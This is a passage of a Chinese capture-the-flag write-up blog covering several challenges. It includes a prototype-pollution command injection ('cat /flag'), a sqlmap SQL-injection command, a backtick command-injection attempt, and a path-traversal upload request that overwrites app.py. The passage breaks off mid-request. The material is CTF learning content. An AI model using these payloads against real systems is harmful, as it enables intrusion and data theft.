+</span></span><span class="line"><span class="cl"><span class="n">submit_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/submit&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="n">result</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">submit_response</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">submit_response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">submit_response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="旅行照片-40">旅行照片 4.0
+</h2><ol>
+<li>
+<p>题目 1-2</p>
+<p>第一题搜地图完事了，第二题的话我其实早就关注了 LEO 酱，甚至还看了一会 ACG 音乐会直播。</p>
+</li>
+<li>
+<p>题目 3-4</p>
+<p>第三题百度搜图搜了很久才找到，三色跑道的公园还挺多的，后来我在 <a class="link" href="https://www.sohu.com/a/499217031_121117453"  target="_blank" rel="noopener"
+    >这里</a> 看到了答案。</p>
+<p>第四题也是百度搜图，很轻松就能搜到三峡大坝，然后查下景区就是 <code>坛子岭</code>。</p>
+</li>
+<li>
+<p>题目 5-6</p>
+<p>没做出来，盒能力还是太弱了，今年旅行照片能做出两题就勉勉强强了。</p>
+</li>
+</ol>
+<h2 id="nodejs-is-web-scale">Node.js is Web Scale
+</h2><p>一眼原型链污染，比较简单。</p>
+<p>步骤：</p>
+<ol>
+<li>设置 key <code>__proto__.name</code> 和 value <code>cat /flag</code></li>
+<li>访问 <code>https://chal03-6w864ftr.hack-challenge.lug.ustc.edu.cn:8443/execute?cmd=name</code></li>
+</ol>
+<p>然后就自动执行了注入的脚本，拿到 flag。</p>
+<h2 id="paolugpt">PaoluGPT
+</h2><p><strong>第一题</strong> 比较简单，就是脚本题，遍历每个网页找 flag。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;https://chal01-8pbt3mw7.hack-challenge.lug.ustc.edu.cn:8443&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TOKEN</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">TOKEN</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">list_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/list&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">list_response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">list_html</span> <span class="o">=</span> <span class="n">list_response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">links</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/view\?conversation_id=.</span><span class="si">{36}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">list_html</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">links</span><span class="p">),</span> <span class="s2">&#34;number of link&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">view_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}{</span><span class="n">link</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">view_response</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">link</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="p">(</span><span class="n">content</span> <span class="o">:=</span> <span class="n">view_response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found flag&#34;</span><span class="p">,</span> <span class="n">link</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">content</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag in&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>第二题</strong> 就比较复杂了，先审查一下源码可以看到 <code>main.py</code> 这部分：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/view&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conversation_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;conversation_id&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="n">execute_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;select title, contents from messages where id = &#39;</span><span class="si">{</span><span class="n">conversation_id</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;view.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">Message</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">results</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">results</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这部分的查询字符串拼接是个很明显的注入点。
+于是 sqlmap 启动：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python sqlmap.py -u &#34;https://chal01-8pbt3mw7.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=63bb4f9a-e016-4e43-a3bc-865f65a7df74&#34; --method GET -p conversation_id --cookie &#34;&lt;session&gt;&#34; --sql-query &#34;select id from messages where shown = false&#34; --threads 4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里只记录了最终的 payload，不过这个表结构是需要自己 dump 一下才知道的，这里就省略了。</p>
+<h2 id="惜字如金-30">惜字如金 3.0
+</h2><p>这是一道 math 题，很显然除了第一问，其余的我都没做出来。</p>
+<p>不过第二问我写了个爆破脚本，但是估算了下，单线程爆破需要 45609 天的时间才能完成&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crc_a</span><span class="p">(</span><span class="nb">input</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">poly</span><span class="p">,</span> <span class="n">poly_degree</span> <span class="o">=</span> <span class="s2">&#34;AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA&#34;</span><span class="p">,</span> <span class="mi">48</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">poly</span><span class="p">)</span> <span class="o">==</span> <span class="n">poly_degree</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">poly</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">poly</span><span class="p">[</span><span class="n">poly_degree</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;A&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flip</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">poly</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">poly_degree</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">poly_degree</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">input</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">digest</span> <span class="o">=</span> <span class="n">digest</span> <span class="o">^</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="n">digest</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">flip</span> <span class="k">if</span> <span class="n">digest</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">digest</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">poly_degree</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash_a</span><span class="p">(</span><span class="nb">input</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="n">crc_a</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">u2</span><span class="p">,</span> <span class="n">u1</span><span class="p">,</span> <span class="n">u0</span> <span class="o">=</span> <span class="mh">0xCB4ECDFD0A9F</span><span class="p">,</span> <span class="mh">0xA9DEC1C1B7A3</span><span class="p">,</span> <span class="mh">0x60C4B0AAB4BF</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="p">(</span><span class="n">u2</span><span class="p">,</span> <span class="n">u1</span><span class="p">,</span> <span class="n">u0</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="mi">223539323800223</span><span class="p">,</span> <span class="mi">186774198532003</span><span class="p">,</span> <span class="mi">106397893833919</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="n">u2</span> <span class="o">+</span> <span class="n">u1</span><span class="p">)</span> <span class="o">+</span> <span class="n">u0</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">digest</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">48</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;little&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crc_b</span><span class="p">(</span><span class="nb">input</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">poly</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">poly_degree</span> <span class="o">=</span> <span class="mi">48</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">poly</span><span class="p">)</span> <span class="o">==</span> <span class="n">poly_degree</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">poly</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">poly</span><span class="p">[</span><span class="n">poly_degree</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flip</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([</span><span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">poly</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">poly_degree</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">poly_degree</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">input</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">digest</span> <span class="o">=</span> <span class="n">digest</span> <span class="o">^</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="n">digest</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">flip</span> <span class="k">if</span> <span class="n">digest</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">digest</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">poly_degree</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash_b</span><span class="p">(</span><span class="nb">input</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">poly</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="n">crc_b</span><span class="p">(</span><span class="nb">input</span><span class="p">,</span> <span class="n">poly</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">u2</span><span class="p">,</span> <span class="n">u1</span><span class="p">,</span> <span class="n">u0</span> <span class="o">=</span> <span class="mh">0xDBEEAED4CF43</span><span class="p">,</span> <span class="mh">0xFDFECEBDEED9</span><span class="p">,</span> <span class="mh">0xB7E85A4E5DCD</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="p">(</span><span class="n">u2</span><span class="p">,</span> <span class="n">u1</span><span class="p">,</span> <span class="n">u0</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="mi">241818181881667</span><span class="p">,</span> <span class="mi">279270832074457</span><span class="p">,</span> <span class="mi">202208575380941</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="n">u2</span> <span class="o">+</span> <span class="n">u1</span><span class="p">)</span> <span class="o">+</span> <span class="n">u0</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">digest</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">48</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;little&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">my_input</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;xxx&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 140737488355328 times</span>
+</span></span><span class="line"><span class="cl">    <span class="n">st</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">selector</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">47</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">poly_center</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;B&#34;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">47</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">poly_index</span><span class="p">,</span> <span class="n">mask</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">selector</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">mask</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">poly_center</span><span class="p">[</span><span class="n">poly_index</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;b&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">poly</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">poly_center</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;B&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">poly</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">100000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">st</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hash_a</span><span class="p">(</span><span class="n">my_input</span><span class="p">)</span> <span class="o">==</span> <span class="n">hash_b</span><span class="p">(</span><span class="n">my_input</span><span class="p">,</span> <span class="n">poly</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found b ploy&#34;</span><span class="p">,</span> <span class="n">poly</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-文件查看器在线版">LESS 文件查看器在线版
+</h2><p>这题作为唯一一道没有解出来的 web 题，同时也只有 3 人完成的题目，就随便讲讲吧。</p>
+<p>看源码审计的时候看到有两处字符串拼接，就以为是路径跨越或者命令注入，但是怎么都注入不进去，比如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">txt`echo aaa`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后确实也就束手无策了。</p>
+<p>最后看到 wp 确实是利用了文件上传和 getshell，虽然没太看明白&hellip;</p>
+<h2 id="禁止内卷">禁止内卷
+</h2><p>flask&hellip;reload&hellip;file upload&hellip; 很经典的文件上传题。</p>
+<p>目标是上传一个跨路径文件，触发 flask reload 加载你的代码，然后打印 flag。</p>
+<p>题目连网站源码的位置都告诉你了，那么就直接替换掉 app.py 吧。</p>
+<p>Payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># 纯手打，不一定完整
+</span></span><span class="line"><span class="cl">GET /submit HTTP1.1
+</span></span><span class="line"><span class="cl">Host: xxx
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------403668309233383699842713014961
+</span></span><span class="line"><span class="cl">Cookie: xxx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------------------403668309233383699842713014961
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;../../../tmp/web/app.py&#34;
+</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
